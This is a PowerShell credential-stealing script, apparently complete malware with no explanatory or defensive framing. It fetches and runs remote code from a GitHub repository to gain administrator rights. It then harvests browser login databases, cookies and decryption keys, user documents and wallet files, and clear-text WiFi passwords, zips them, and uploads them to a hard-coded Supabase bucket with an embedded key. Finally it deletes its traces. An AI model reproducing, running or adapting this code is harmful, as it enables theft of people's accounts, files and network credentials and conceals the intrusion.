$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $url = "https://raw.githubusercontent.com/KaloyanSyS32/stealerz/refs/heads/main/s"
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$url')`""
    exit
}

$sbUrl = "https://kjoxaevacnruadftkjxc.supabase.co/storage/v1/object/data/$($env:COMPUTERNAME)_$(Get-Date -Format "yyyyMMdd_HHmm").zip"
$sbKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtqb3hhZXZhY25ydWFkZnRranhjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgxNjA4NjAsImV4cCI6MjA5MzczNjg2MH0.OVuVfwrLPgxcrX3W0xjF-FVQBB9qMbMB1s-vL8aV_aY"

$staging = Join-Path $env:TEMP "staging_$(Get-Random)"
New-Item -Path $staging -ItemType Directory -Force | Out-Null

# 1. Credential Database Extraction (Browsers)
$browsers = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
}

foreach ($b in $browsers.GetEnumerator()) {
    $dest = New-Item -Path (Join-Path $staging "Browsers\$($b.Key)") -ItemType Directory -Force
    # Copy master key for offline decryption
    if (Test-Path "$($b.Value)\Local State") { Copy-Item "$($b.Value)\Local State" -Destination $dest }
    # Harvest DBs
    Get-ChildItem -Path $b.Value -Recurse -Include "Login Data", "Cookies", "Web Data" -ErrorAction SilentlyContinue | Copy-Item -Destination $dest
}

# 2. Document & Wallet Harvesting
$exts = @("*.txt", "*.pdf", "*.docx", "*.xlsx", "*.key", "*.wallet", "*.rdp", "*.sql")
Get-ChildItem -Path "$env:USERPROFILE" -Include $exts -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
    $fileDest = Join-Path $staging "Files"
    if (-not (Test-Path $fileDest)) { New-Item $fileDest -ItemType Directory -Force | Out-Null }
    Copy-Item $_.FullName -Destination $fileDest -ErrorAction SilentlyContinue
}

# 3. WiFi and System Recon
$recon = Join-Path $staging "Recon"
New-Item $recon -ItemType Directory -Force | Out-Null
netsh wlan export profile key=clear folder=$recon | Out-Null
Get-Process | Select-Object Name, CPU, Path | Export-Csv -Path (Join-Path $recon "procs.csv") -NoTypeInformation
ipconfig /all > (Join-Path $recon "net.txt")

# 4. Compression & Transmission
$zip = "$env:TEMP\upload.zip"
Compress-Archive -Path "$staging\*" -DestinationPath $zip -Force

$headers = @{
    "Authorization" = "Bearer $sbKey"
    "apikey"        = $sbKey
    "Content-Type"  = "application/zip"
    "x-upsert"      = "true"
}

$bytes = [System.IO.File]::ReadAllBytes($zip)
Invoke-RestMethod -Uri $sbUrl -Method Post -Headers $headers -Body $bytes

# 5. Anti-Forensic Cleanup
Remove-Item $staging -Recurse -Force
Remove-Item $zip -Force
